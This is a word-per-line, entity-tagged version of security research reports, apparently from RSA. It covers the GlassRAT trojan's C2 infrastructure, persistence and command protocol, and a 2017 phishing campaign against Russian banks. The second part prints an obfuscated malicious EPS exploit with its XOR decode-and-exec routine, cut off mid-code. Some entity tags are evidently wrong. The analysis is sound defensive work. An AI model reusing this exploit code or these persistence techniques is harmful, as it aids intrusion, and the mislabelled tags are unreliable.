malware9
targeting
the
Philippines
military10
.

The
malicious
domain
mechanicnote.com B_url.cncsvr
was
used
for
C2
by
several
different
types
of
malware
,
including
Mirage
malware11
used
for
targeting
the
Philippine
military
.

This
malware
with
mechanicnote.com B_url.cncsvr
domain
C2
used
a
controller
on
the
same
IP
address
and
server
also
used
for
GlassRAT B_malware.drop
malware
C2
(
101.55.x.x B_ip.cncsvr
,
bits.foryousee.net B_url.cncsvr
)
.

The
domain
news-google.net B_url.cncsvr
employed
by
MagicFire
malware12
C2
targeting
the
Philippine
military
,
also
used
a
malware
controller
hosted
on
the
IP
address
173.231.x.x B_ip.cncsvr
,
which
was
used
for
Mongolia-targeting
PlugX
malware13
employing
the
malicious
cainformations.com B_url.cncsvr
domain
.

Another
mecahnicnote.com  B_url.cncsvr
C2
URL
used
the
same
IP
address
,
198.40.x.x  B_ip.cncsvr
,
as
did
malware
using
cainformations.com B_url.cncsvr
and
alternate009.com B_url.cncsvr
domains
for
C2
.

These
domains
in
turn
are
tied
directly
to
Magicfire
,
Mirage
and
PlugX
malware
in
several
malicious
campaigns
.

To
summarize
the
GlassRAT B_malware.drop
C2
infrastructure
connections
,
we
have
GlassRAT B_malware.drop
connected
to
Mirage
malware
C2
hosting
,
which
in
turn
is
connected
to
Magicfire
,
PlugX
and
Mirage
malware
targeting
the
Philippine
military
and
the
Mongolia
government
.

The
temporal
overlap
window
in
shared
infrastructure
was
relatively
short
implying
a
possible
operational
security
slip
by
the
actors
behind
GlassRAT B_malware.drop
if
not
deliberate
sharing
of
infrastructure
.

The
infrastructure
overlap
traced
by
RSA
Research
can
be
seen
in
detail
in
the
attached
C2
overlap
graphic
in
the
Appendix
.

4
http://www.secureworks.com/cyber-threat-intelligence/threats/the-mirage-campaign/ B_url.normal

5
https://www.blackhat.com/docs/asia-14/materials/Haruyama/Asia-14-Haruyama-I-Know-You-Want-Me-Unplugging-PlugX.pdf B_url.normal

6
http://pastebin.com/B2jNMrM8 B_url.normal

7
https://www.threatconnect.com/khaan-quest-chinese-cyber-espionage-targeting-mongolia/ B_url.normal

8
http://pastebin.com/B2jNMrM8 B_url.normal

9
https://www.virustotal.com/en/file/421f4c83898ff3ae9b2a94621140ef770888a8a0914b163cdae4690433173899/analysis/ B_url.normal

10
http://blog.trendmicro.com/trendlabs-security-intelligence/christmas-themed-malware-starts-to-jingle-all-the-way/ B_url.normal

11
https://www.virustotal.com/en/file/91279f578d2836ea679ae9578068cb70810fb781faf6d7c03c3212aa509f3e7b/analysis/ B_url.normal

12
https://www.virustotal.com/en/file/2ee38b14a570f693c093a53c53c6d10234fb11cfb7318022190cdb8c96d73b35/analysis/ B_url.normal

13
http://pastebin.com/B2jNMrM8 B_url.normal

5

DROPPER
SUBMISSIONS
FROM
CHINA

As
discussed
above
,
RSA
Research
was
first
alerted
to
some
specific
zero
detection
malware
by
the
RSA
Incident
Response
services
team
.

Also
notable
is
that
the
first
observed
sample14
of
this
zero
detection
malware
may
have
been
deployed
since
September
of
2012
,
if
the
compile
time
(
Figure
1
)
is
any
indicator
.

We
do
n't
know
if
there
is
any
connection
between
the
compilation
of
GlassRAT B_malware.drop
and
the
reports
of
malware
outlined
above
,
much
occurring
in
roughly
the
same
timeframe
.

Figure
1
Compilation
timestamp
of
first
known
sample
of
GlassRAT B_malware.drop
malware
,
appearing
on
VirusTotal
in
September
of
2014
.

The
indicators
(
see
GlassRAT B_malware.drop
Yara
signature
in
appendix
)
were
fed
into
the
RSA
Research
hunting
capability
.

Months
later
;
RSA
Research
was
alerted
to
two
samples
of
the
GlassRAT B_malware.drop
malware
installer
program
or
'dropper
.
'

Both
of
these
dropper
samples
were
not
detected
by
static
analysis
routines
of
57
different
Antivirus
vendors
(
Figure
2
)
on
the
VirusTotal
website
.

Figure
2
Zero
Antivirus
detection
ratio
of
GlassRAT B_malware.drop
dropper
The
two
GlassRAT B_malware.drop
malware
dropper
samples
were
functionally
identical
.

One
of
the
samples
was
uploaded
to
VirusTotal
about
four
hours
before
the
next
dropper15
.

The
second
GlassRAT B_malware.drop
dropper
for
which
RSA
Research
was
alerted16
was
signed
with
a
valid
code-signing
certificate
associated
with
a
Beijing-based
software
developer
.

One
particular
application
associated
with
this
developer
has
over
half
a
billion
users
worldwide
,
according
to
the
company
.

14
https://www.virustotal.com/en/file/89317809806ef90bb619a4163562f7db3ca70768db706a4ea483fdb370a79ede/analysis/  B_url.normal

15
https://www.virustotal.com/en/file/c11faf7290299bb13925e46d040ed59ab3ca8938eab1f171aa452603602155cb/analysis/  B_url.normal

16
https://www.virustotal.com/en/file/30d26aebcee21e4811ff3a44a7198a5c519843a24f334880384a7158e07ae399/analysis/  B_url.normal

6

UNDER
THE
RADAR
FOR
YEARS
,
TARGETS
CHINESE
NATIONALS
OR
ORGANIZATIONS

Also
notable
is
that
the
first
publically
accessible
sample
of
this
zero-detection
malware
(
Figure
3
)
may
have
been
in
the
wild
since
September
of
2012
,
if
the
compile
time
is
any
indicator
.

RSA
Research
has
no
reason
to
suspect
that
the
compile
date
was
forged
.

Additionally
,
RSA
has
learned
through
telemetry
data
and
limited
anecdotal
reports
that
GlassRAT B_malware.drop
may
principally
be
targeting
Chinese
nationals
or
other
Chinese
speakers
,
in
China
and
elsewhere
,
since
at
least
early
2013
.

The
samples
uploaded
on
24
September
2015
appear
to
be
the
first
known
instance
of
the
dropper/installer
files
.

Figure
3
First
sample
of
GlassRAT B_malware.drop
known
in
the
wild

The
absence
of
an
identified
dropper
in
public
malware
databases
prior
to
September
2015
may
explain
why
the
GlassRAT B_malware.drop
Trojan
has
maintained
a
low
profile
with
AV
vendors
since
its
first
appearance
on
VirusTotal
in
December
of
2014
(
Figure
4
)
.

Figure
4
First
submission
date
of
identified
GlassRAT B_malware.drop
malware
as
per
VirusTotal

Figure
5
shows
some
of
the
code-signing
certificate
details
,
with
the
name
of
the
software
developer
redacted
.

7

Figure
5
GlassRAT B_malware.drop
signed
file
metadata

At
the
time
of
this
writing
,
the
malware
has
been
shared
with
Symantec
and
Adobe
,
who
were
indirectly
effected
because
of
the
Adobe
trademark
and
the
Symantec/Verisign
certificate
.

As
more
vendors
are
made
aware
of
this
malware
,
RSA
Research
believes
the
detection
ratio
will
increase
from
the
near
zero
ratio
at
the
time
of
this
writing
.

GlassRAT B_malware.drop
MALWARE
ANALYSIS
,
DESIGNED
FOR
DECEPTION

RSA
's
Research
has
analyzed
the
GlassRAT B_malware.drop
trojan
and
determined
that
it
is
a
simple
but
capable
RAT
with
reverse
shell
as
well
as
other
typical
capabilities
of
RATs
,
such
as
file
transferring
and
process
listing
.

The
GlassRAT B_malware.drop
dropper
uses
the
trademarked
icon
of
Adobe
Flash
player
,
and
was
named
'Flash.exe
'
(
Figure
6
)
when
it
was
uploaded
to
VirusTotal
from
an
IP
address
,
likely
in
the
Peoples
Republic
of
China
on
September
17
,
2015
.

Figure
6
GlassRAT B_malware.drop
dropper
as
viewed
in
Windows
Explorer

Double
clicking
on
the
flash.exe
files
causes
the
dropper
to
launch
.

The
GlassRAT B_malware.drop
malware
installation
is
as
follows
:

1
.

Dropper
(
flash.exe
)
writes
the
GlassRAT B_malware.drop
DLL
to
the
ProgramData
folder

2
.

Dropper
runs
the
DLL
file
using
the
built-in
Windows
utility
rundll32.exe

3
.

GlassRAT B_malware.drop
DLL
file
modifies
the
run
key
for
logon
persistence
with
user-level
permissions
with
the
following
registry
key
.

HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Update

4.

the
dropper
deletes
itself
with
and
embedded
command
:
'cmd.exe
/c
erase
/F
'
%
s
'
,
'

8

While
the
DDL
file
is
actually
written
to
the
root
of
'C
:
\ProgramData
'
the
registry
entry
points
to
the
legacy
junction
in
Windows
Vista
and
later
'C
:
\ProgramData\Application
Data\
'
as
would
be
shown
in
the
Microsoft
SysInternals
Autoruns
tool
.

Figure
7
GlassRAT B_malware.drop
non-privileged
persistence
as
viewed
through
the
Autoruns
tool

Manually
bypassing
UAC
with
a
right-click
reveals
metadata
associated
with
the
dropper
(
Figure
8
)
.

Figure
8
UAC
pop-up
if
invoked
with
right
click
and
'Run
as
administrator
'

The
program
name
text
presented
in
the
UAC
dialog
box
is
identical
to
the
name
of
the
legitimate
'500
million-user
'
application
produced
by
the
owner
of
the
certificate
.

In
the
case
of
installation
with
privileged
user
rights
such
as
might
be
obtained
by
an
exploit
or
particularly
good
social
engineering
technique
,
persistence
would
consist
of
installation
as
an
unused
service
(
such
as
the
'RasAuto
'
service
in
Figure
9
)
,
which
is
commonly
a
disabled-by-default
service
on
ordinary
Windows
user/client
PC
's
.

HKLM\System\CurrentControlSet\Services
c
:
\programdata\application
data\updatef.dll
Figure
9
GlassRAT B_malware.drop
persistence
mechanism
if
installed
using
administrative
privileges

The
timestamp
on
the
DLL
reflects
the
compile
date
of
the
binary
.

RSA
Research
found
samples
of
GlassRAT B_malware.drop
with
three
unique
C2
configurations
(
Table
1
)
.

Static
analysis
of
these
GlassRAT B_malware.drop
DLL
's
revealed
that
the
C2
host
configuration
is
obfuscated
in
all
of
the
samples
using
a
simple
XOR
technique
,
utilizing
0x01
as
the
one-byte
key
.

The
most
recent
sample
used
URL
's
for
C2
,
other
samples
used
URL
's
in
combination
with
a
hard
coded
IP
address
(
perhaps
as
a
backup
)
,
and
yet
another
GlassRAT B_malware.drop
sample
we
found
used
only
a
single
IP
address
with
no
URLs
.

The
C2
port
for
each
specified
C2
node
is
stored
as
a
packed
string
and
can
be
readily
decoded
with
a
simple
script
.

9

GlassRAT B_malware.drop
DLL
MD5

5c17395731ec666ad0056d3c88e99c4d B_hash

003/064/50/60

e98027f502f5acbcb5eda17e67a21cdc B_hash

59b404076e1af7d0faae4a62fa41b69f B_hash

Obfuscated
C2
hosts
(
s
)

chur/gnsxntrdd/odu
012/31/084/353

py/s'trdsr/bnl

ly/s'trdsr/bnl

yy/s'trdsr/bnl

C2
hosts
XOR
decoded
with
0x01

112.175.x.x B_ip.cncsvr

bits.foryousee.net B_url.cncsvr

103.20.x.x B_ip.cncsvr

qx.rausers.com B_url.cncsvr

mx.rausers.com B_url.cncsvr

xx.rausers.com B_url.cncsvr

Table
1
Three
different
GlassRAT B_malware.drop
C2
host
configurations
found
in
the
wild
by
RSA
Research

GlassRAT B_malware.drop
CAPABILITIES
AND
FUNCTIONS

GlassRAT B_malware.drop
provides
reverse
shell
functionality
to
an
infected
victim
.

The
communication
contains
a
handshake
between
the
attacker
and
the
victim
.

The
sample
will
send
the
hard
coded
value
0x
cb
ff
5d
c9
ad
3f
5b
a1
54
13
fe
fb
05
c6
22
,
the
response
from
the
C2
is
then
compared
with
the
value
0x3f5ba154
and
then
the
subsequent
commands
are
a
series
of
two
byte
codes
.

The
malware
performs
a
sanity
check
to
make
sure
that
the
low
byte
of
the
two-byte
combinations
is
17
(
0x11
)
or
less
.

A
QWORD
is
used
to
track
directionality
,
and
a
DWORD
is
used
to
delimit
data
size
.

Control
data
is
then
passed
to
and
from
GlassRAT B_malware.drop
in
the
clear
,
such
that
system
information
and
Windows
command
shell
output
would
be
readily
observable
in
network
traffic
.

GlassRAT B_malware.drop
initially
accepts
two
primary
commands
(
both
with
a
set
of
sub
commands
)
from
its
controller
which
are
as
follows
:

0x01
:
Provides/Enumerates
system
information
from
the
victim
host

0x02
:
Native
Command
and
reverse
shell
communications
and
output
.

The
initial
beacon
and
handshake
of
controller-initiated
C2
will
pass
the
IP
address
of
the
victim
to
the
GlassRAT B_malware.drop
controller
.

However
,
this
was
not
observed
in
our
dynamic
analysis
,
suggesting
that
it
requires
manual
command
from
the
C2
operator
.

Perhaps
such
commands
are
performed
by
the
operator
only
if
a
connection
by
a
nosy
researcher
has
been
ruled
out
.

When
the
0x01
primary
command
is
issued
the
malware
is
configured
with
the
following
subcommands
,
which
are
in
red
.

0x01
01
–
C2
request
for
System
Information

0x01
02
–
Victim
response
to
request
for
system
information

0x01
03
–
C2/Victim
keep
alive

0x01
06
–
C2
Read
C:\ProgramData\off.dat

When
the
0x02
primary
command
is
issued
the
malware
is
configured
with
the
following
subcommands
.

Not
all
of
the
17
possibilities
are
utilized
in
the
samples
that
were
analyzed
,
and
this
could
allow
for
future
expansion
of
the
malware
's
capabilities
by
its
author
(
s
)
.

0x02
01
–
C2
Cmd
command

0x02
02
–
Victim
Response
from
cmd
commands

0x02
03
–
C2
initiate
cmd.exe
pipe/thread

0x02
04
–
C2
kill
cmd
pipe/thread

0x02
05
–
C2
execute
file/start
process

0x02
06
–
Not
Used/present

0x02
07
–
Not
Used/present

0x02
08
–
Victim
response
to
file
download
–
File
not
found

0x02
09
–
Not
Used/present

0x02
0A
–
Not
Used/present

0x02
0B
–
C2
command
to
get
handle
information

0x02
0C
–
Download
file
from
Victim

0x02
0D
–
Victim
response
to
file
download
–
File
transmission

10

0x02
0E
–
Upload/write
file
to
Victim

0x02
0F
–
Not
Used/present

0x02
10
–
C2
command
to
get
handle
information

0x02
11
–
Create
process
on
Victim

0x02
12
–
Victim
response
to
file
upload

COMMAND
AND
CONTROL

To
perform
dynamic
analysis
on
the
new
dropper
,
RSA
Research
leveraged
RSA
Security
Analytics
(
Figure
10
)
and
RSA
ECAT
to
quickly
gather
indicators
and
forensic
details
about
the
GlassRAT B_malware.drop
malware
.

Figure
10
GlassRAT B_malware.drop
C2
activity
in
RSA®
Security
Analytics

RSA®
ECAT
(
Figure
11
)
reveals
that
the
Trojan
is
loaded
as
RasAuto
service
(
via
svchost.exe
network
service
process
)
when
installed
with
administrative
privileges
,
and
Figure
12
indicates
detection
by
RSA®
ECAT
when
installed
with
non-privileged
credentials
(
rundll32.exe
running
the
GlassRAT B_malware.drop
DLL
)
.

Figure
11
GlassRAT B_malware.drop
(
administrative
install
)
C2
as
detected
by
RSA®
ECAT

11

Figure
12
GlassRAT B_malware.drop
(
user-level
install
)
C2
as
detected
by
RSA®
ECAT

Analysts
wishing
to
leverage
RSA®
ECAT
to
find
RATs
including
GlassRAT B_malware.drop
in
their
enterprise
networks
may
want
to
refer
to
the
technical
whitepaper
'Catching
the
R.A.T.
with
ECAT'17
presented
at
RSA
Charge
by
Justin
Lamarre
.

RSA®
Security
Analytics
reveals
connections
to
following
host
aliases
,
which
as
of
the
time
of
this
writing
,
resolve
to
the
same
IP
address
:
115.144.x.x B_ip.cncsvr
in
South
Korea
.

The
GlassRAT B_malware.drop
connects
with
the
following
string
in
the
handshake
.

cb
ff
5d
c9
ad
3f
5b
a1
54
13
fe
fb
05
c6
22

The
handshake
protocol
has
been
incorporated
into
a
parser
for
RSA®
Security
Analytics
(
Figure
13
)
that
is
included
in
this
report
's
annex
,
as
well
as
on
RSA®
Live
.

Figure
13
GlassRAT B_malware.drop
C2
parser
in
action
on
RSA®
Security
Analytics

Even
without
the
parser
(
typical
with
a
protocol-abusing
raw
socket
connection
)
RSA®
Security
Analytics
flags
on
'unknown
service
over
http
port
'
and
'unknown
service
over
ssl
port
'
(
Figure
14
)
,
cluing
the
security
investigator
to
the
probability
that
the
traffic
is
malicious
.

17
http://charge.rsa.com/wp-content/uploads/2015/09/Finding-The-R.A.T-With-ECAT.pdf B_url.normal

12

Figure
14
GlassRAT B_malware.drop
protocol
abuse
identified
by
Security
Analytics

In
each
case
,
the
Trojan
dropper
installed
the
DLL
with
the
file
pointer
hard
coded
to
be
12
megabytes
in
size
.

Thus
,
although
the
functional
part
of
the
GlassRAT B_malware.drop
DLL
is
only
16kb
or
so
in
size
,
the
file
size
shown
on
disk
is
much
larger
(
Figure
15
)
.

Figure
15
GlassRAT B_malware.drop
DLL
takes
11+MB
on
disk
,
but
consists
of
mostly
null
data
bytes

APPENDIX

Campaign
C2
overlap
graphic

Malware
hashes

C2
infrastructure
(
some
IP
addresses
redacted
)

GlassRAT B_malware.drop
Yara
signature

PRIVATE
ANNEX

Unredacted
C2
infrastructure

Unredacted
campaign
C2
overlap
graphic

GlassRAT B_malware.drop
C2
decoder
script

(
RSA
customers
and
vetted
industry
partners
can
have
access
to
the
private
annex
by
emailing
conops@RSA.com
.
)

13
Russian
Bank
Offices
Hit
with
Broad
Phishing
Wave

community.rsa.com/community/products/netwitness/blog/2017/08/17/russian-bank-offices-hit-with-broad-phishing-wave B_url.normal

By
far
most
of
the
bank-related
phishing
campaigns
described
in
security
advisories
and
reports
consist
of
bank
customers
being
targeted
for
their
online
credentials
.

Much
less
common
is
a
phishing
campaign
targeting
the
banks
themselves
.

Perhaps
fraudsters
know
that
there
are
a
lot
more
bank
customers
than
there
are
banks
,
and
generally
banks
have
a
more
hardened
security
posture
than
the
average
bank
's
customer
.

Target
:
multiple
bank
offices
in
Russia

But
still
,
payoff
potential
for
a
successful
bank
compromise
might
be
considerable
.

In
this
threat
advisory
,
we
describe
a
Russian-language
phishing
campaign
active
during
the
second
week
of
August
2017
,
targeting
not
the
usual
banking
customers
,
but
the
Russian
banks
themselves
.

And
in
an
unusual
reversal
of
typical
bank
phishing
social
engineering
tactics
,
the
phishing
emails
purport
to
be
from
the
bank
's
customers
.

Consider
the
following
phish
delivered
to
the
email
address
displayed
on
the
bank
's
website
.

In
the
email
screenshot
with
our
added
machine
translation
from
Russian
,
notice
the
subject
line
and
message
body
text
reflecting
a
'business
customer
upset
about
extra
charges
on
his
credit
card
'
social
engineering
theme
(
Figure
1
)
.

Figure
1
Phishing
email
targeting
Russia
bank
#
1
,
machine
translation
in
red
boxes

Figure
2
is
a
screenshot
of
another
phishing
email
obtained
by
RSA
FirstWatch
,
targeting
'Russia
bank
#
2
.
'

While
this
email
is
part
of
the
same
campaign
,
note
that
the
body
text
,
subject
lines
,
file
name
,
and
@
mail.com
sender
email
is
different
from
that
targeting
Russia
bank
#
1
,
suggesting
at
least
some
manual
actor
modifications
to
the
phishing
email
construction
.

Figure
2
Phishing
email
targeting
Russia
bank
#
1
,
machine
translation
in
red
boxes

RSA
FirstWatch
identified
23
such
attachments
in
this
campaign
,
all
using
what
appeared
to
be
the
exact
same
EPS
exploit
.

The
disgruntled
banking
customer
was
consistent
throughout
;
illustrated
below
are
a
few
attachment
examples
:

Exploit
attachment
#
1
was
deployed
with
the
following
names
in
Russian
:

Выписка
по
счету.docx
(
'Account
statement
'
)

Выписка
по
карте.docx
(
'Card
statement
'
)

Персональные
данные.docx
(
'Personal
information
'
)

1/9

Exploit
attachment
#
2
was
deployed
with
the
following
names
:

Выписка
по
карте.docx
(
or
'Card
statement
'
)

Выписка
по
карте
клиента.docx
(
or
'Customer
card
statement
'
)

Exploit
attachment
#
3
was
deployed
using
the
following
name
:

Выписка.docx
(
or
'Statement
'
)

Note
:
Hashes
of
all
samples
will
be
included
in
the
Appendix
of
this
analysis
.

As
of
10
August
2017
,
RSA
FirstWatch
has
high
confidence
that
multiple
individuals
at
many
Russian
banks
were
targeted
with
these
malicious
attachments
,
and
believe
this
campaign
was
subsequently
brought
to
the
attention
of
the
Central
Bank
of
Russia
's
FinCERT
by
one
or
more
of
the
banks
being
targeted
.

On
17
August
2017
,
the
day
we
were
finishing
up
this
analysis
,
a
new
sample
was
discovered
being
deployed
,
with
a
different
C2
node
and
slightly
different
communication
.

An
exploit
in
someone
else
's
wrapper
?

Before
we
get
to
details
about
the
exploit
used
in
this
campaign
,
we
should
cover
some
history
on
EPS
exploits
in
docx
files
.

FireEye
discovered
a
malicious
docx
exploiting
a
zero B_malware.backdoor
day I
vulnerability
in
Microsoft
's
Encapsulated
Postscript
(
EPS
)
filter
,
in
the
summer
of
2015
.

This
EPS
exploit
was
assigned
CVE-2015-2545
.

In
March
2017
,
FireEye
observed
both
nation
state
and
financially
motivated
actors
using
EPS
zero B_malware.backdoor
day I
exploits
assigned
as
CVE-2017-0261
and
CVE-2017-0262
,
prior
to
Microsoft
disabling
EPS
rendering
in
its
Office
products
with
an
update
in
April
2017
.

So
it
is
likely
one
of
these
three
EPS
exploits
is
being
employed
with
the
perpetrator
activity
under
investigation
,
perhaps
hoping
that
their
targets
have
n't
applied
the
April
patch
that
would
make
every
EPS
exploit
futile
.

Since
docx
files
are
just
a
Zip-compressed
container
,
comparing
them
with
a
file
tree
view
might
be
a
quick
way
to
assess
similarity
on
a
high
level
.

In
fact
,
all
23
known
docx
files
used
in
this
campaign
are
very
nearly
identical
,
with
the
same
12
component
files
.

Varying
checksums
might
have
to
do
with
build
artifacts
,
perhaps
even
intentionally
so
,
in
order
to
generate
a
unique
hash
with
each
build
.

Figure
3
Tree
view
of
docx
container
file
used
to
target
Russian
banks
last
week

Interesting
enough
10
of
these
12
docx
component
files
(
everything
but
the
image1.eps
and
document.xml
files
)
are
dated
April
18
th
.

This
is
no
coincidence
;
in
fact
,
those
same
docx
component
files
were
found
in
the
attachment
used
by
nation-state
actors
in
their
email
targeting
of
an
Eastern
European
Ministry
of
Foreign
Affairs
,
back
when
this
EPS
exploit
was
still
a
zero B_malware.backdoor
day I
(
Figure
4
)
.

2/9

Figure
4
Eastern
European
Ministry
of
Foreign
Affairs
targeted
by
suspected
nation
state
actors

So
if
we
compare
the
tree
view
of
that
older
docx
container
(
Figure
5
)
,
we
see
that
10
of
the
same
component
files
appear
identical
,
and
we
can
confirm
that
using
cryptographic
hashing
.

Figure
5
Tree
view
of
'Trump
'
exploit
docx
container
,
with
10
of
12
files
identical
to
23
recent
RU
bank
targeting
samples
described
in
this
investigation

Of
special
note
is
the
common
app.xml
file
,
which
comes
directly
from
the
decoy
document
in
the
'Trump
'
exploit
file
.

This
app.xml
file
contains
the
same
URL
to
the
California
Courier
website
(
www[.]thecaliforniacourier[.]com B_url.cncsvr
)
,
where
the
text
was
copied
from
'Trump
's
Attack
on
Syria
:
Wrong
for
so
Many
Reasons
'
as
described
by
ESET
in
their
exploit
analysis
.

3/9

Clearly
there
was
some
'borrowing
'
going
on
between
this
current
bank-targeting
campaign
and
the
previous
nation-state
espionage
campaign
.

Does
this
suggest
that
these
campaigns
and
actors
are
in
any
way
complicit/related
?

No
.

On
the
contrary
,
national
interests
seem
to
imply
that
those
particular
espionage-focused
actors
(
i.e.
,
from
the
'Trump
'
campaign
)
would
almost
certainly
NOT
be
involved
in
broadly
exploiting
Russian
banks
a
few
months
later
.

That
being
said
,
an
alternative
hypothesis
is
that
these
bank-targeting
actors
purposely
purloined
the
older
espionage
related
docx
files
to
introduce
uncertainty
and/or
mis-attribution
,
or
even
to
send
a
message
to
defenders
or
researchers
.

As
we
'll
see
shortly
,
the
attackers
also
interestingly
signed
(
commented
)
their
malware
with
lyrics
from
Slipknot
's
Snuff
.

Figure
6
Google
result
with
Slipknot
Snuff
lyrics

Which
exploit
is
this
?

Obfuscation
is
important
for
exploits
,
especially
when
a
campaign
that
is
broad
as
this
one
is
up
against
a
gamut
of
financial
institutions
with
AV
's
that
have
had
plenty
of
time
to
add
detection
for
known
EPS
exploits
.

With
initial
AV
coverage
of
these
two
dozen
or
so
attachments
in
the
single
digits
out
of
more
than
50
AV
vendors
,
RSA
Engineering
's
Kevin
Douglas
jumped
at
the
chance
to
flex
his
deobfuscation
skills
,
and
here
steps
us
through
our
exploit
assessment
.

Step
1
.

Unzipping
the
sample
DOCX
file
,
reveals
the
following
embedded
EPS
Image
file

unzip
./2c86a55cefd05352793c603421b2d815f0e1ddf08e598e7a3f0f6b1d3928aca8

Archive
:
./2c86a55cefd05352793c603421b2d815f0e1ddf08e598e7a3f0f6b1d3928aca8

inflating
:
[
Content_Types].xml

inflating
:
docProps/app.xml

inflating
:
docProps/core.xml

inflating
:
word/document.xml

inflating
:
word/fontTable.xml

inflating
:
word/settings.xml

inflating
:
word/styles.xml

inflating
:
word/webSettings.xml

inflating
:
word/media/image1.eps

inflating
:
word/theme/theme1.xml

inflating
:
word/_rels/document.xml.rels

inflating
:
_rels/.rels

Step
2
.

Examining
the
app.xml
file
,
we
can
see
a
suspicious
URL
artifact

cat
docProps/app.xml

<
?
xml
version='1.0
'
encoding='UTF-8
'
standalone='yes
'
?
>
4/9
<
Properties
xmlns='http://schemas.openxmlformats.org/officeDocument/2006/extended-properties B_url.cncsvr
'
xmlns:vt='http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes'><Template>Normal.dotm</Template><TotalTime>1</TotalTime
>
<
Pages
>
2
<
/Pages
>
<
Words
>
958
<
/Words
>
<
Characters
>
5462
<
/Characters
>
<
Application
>
Microsoft
Office
Word
<
/Application
>
<
DocSecurity
>
0
<
/DocSecurity
>
<
Lines
>
45
<
/Lines
>
<
Paragraphs
>
12
<
/Paragraphs
>
<
ScaleCrop
>
false
<
/ScaleCrop
>
<
HeadingPairs
>
<
vt
:
vector
size='2
'
baseType='variant
'
>
<
vt
:
variant
>
<
vt
:
lpstr
>
Title
<
/vt
:
lpstr
>
<
/vt
:
variant
>
<
vt
:
variant
>
<
vt
:
i4
>
1
<
/vt
:
i4
>
<
/vt
:
variant
>
<
/vt
:
vector
>
<
/HeadingPairs
>
<
TitlesOfParts
>
<
vt
:
vector
size='1
'
baseType='lpstr
'
>
<
vt
:
lpstr
>
<
/vt
:
lpstr
>
<
/vt
:
vector
>
<
/TitlesOfParts
>
<
Company
>
<
/Company
>
<
LinksUpToDate
>
false
<
/LinksUpToDate
>
<
CharactersWithSpaces
>
6408
<
/CharactersWithSpaces
>
<
SharedDoc
>
false
<
/SharedDoc
>
<
HLinks
>
<
vt
:
vector
size='6
'
baseType='variant
'
>
<
vt
:
variant
>
<
vt
:
i4
>
4456521
<
/vt
:
i4
>
<
/vt
:
variant
>
<
vt
:
variant
>
<
vt
:
i4
>
0
<
/vt
:
i4
>
<
/vt
:
variant
>
<
vt
:
variant
>
<
vt
:
i4
>
0
<
/vt
:
i4
>
<
/vt
:
variant
>
<
vt
:
variant
>
<
vt
:
i4
>
5
<
/vt
:
i4
>
<
/vt
:
variant
>
<
vt
:
variant
>
<
vt:lpwstr>hXXp://www[.]thecaliforniacourier[.]com
<
/vt
:
lpwstr
>
<
/vt
:
variant
>
<
vt
:
variant
>
<
vt
:
lpwstr
>
<
/vt
:
lpwstr
>
<
/vt
:
variant
>
<
/vt
:
vector
>
<
/HLinks
>
<
HyperlinksChanged
>
false
<
/HyperlinksChanged><AppVersion>15.0000</AppVersion></Properties
>

Step
3
.

Examining
the
image1.eps
file
,
we
can
see
:

1
.

A
likely
multibyte
XOR
key
(
<
7a5d5e20
>
)

2
.

Quoting
lyrics
from
Slipknot
's
Snuff
in
the
comments
(
%
%
Myheartisjusttoodarktocare
,
%
%
Icantdestroywhatisntthere
)

3
.

A
likely
XOR
encoded
hexadecimal
payload
(
<
017d71681f3128450e343d415a3b374e1e3b314e0e7d6f104a7d2d431b313b4615332a0009382a4615332a001d3131421b313a491

4
.

9297e421f3a...
>
)

5
.

A
likely
XOR
decode
loop
:
(
0
1
A1
length
1
sub
{
/A5
exch
def
A1
A5
2
copy
get
A2
A5
4
mod
get
xor
put
}
for
A1
}
)

6
.

A
likely
execution
of
the
payload
once
it
is
decoded
(
exec
)

7
.

Repetitive
obfuscated
comments
translating
to
'kasper-pidor
kasper-pidor
kasper-pidor
kasper-pidor
'
scattered
throughout
to
make
the
code
that
make
it
harder
to
read
.

These
are
highlighted
in
green...
and
possibly
speak
to
something
more
personal
between
the
actors
and
Kaspersky
possibly
?

(
e.g.
,
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
)

Dump
of
image1.EPS
code
:

%
!
PS-Adobe-3.0
EPSF-3.0
%
%
BoundingBox
:
31
24
51
654
%
%
Page
:
1
1
/Times-Roman
findfont
globaldict
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
begin
/l0
11
def
l0
scalefont
setfont
newpath
/E1
600
def
4
E1
moveto
/l2
E1
def
/l3
{
/l4
exch
def
/l2
l2
l0
sub
def
12
l2
moveto
l4
show
}
/min
{
2
copy
gt
{
exch
}
if
pop
}
bind
def
/max
{
2
copy
lt
{
exch
}
if
pop
}
bind
def
/A3
{
token
pop
exch
pop
}
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
def
/A2
%
%
6b61737065722d706
%
%
6b61737065722d706
<
7a5d5e20
>
def
/A4
{
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
/A1
exch
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
def
0
1
A1
length
1
sub
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
{
/A5
exch
def
A1
A5
2
copy
get
A2
A5
4
mod
get
xor
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
put
}
for
A1
}
5/9
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
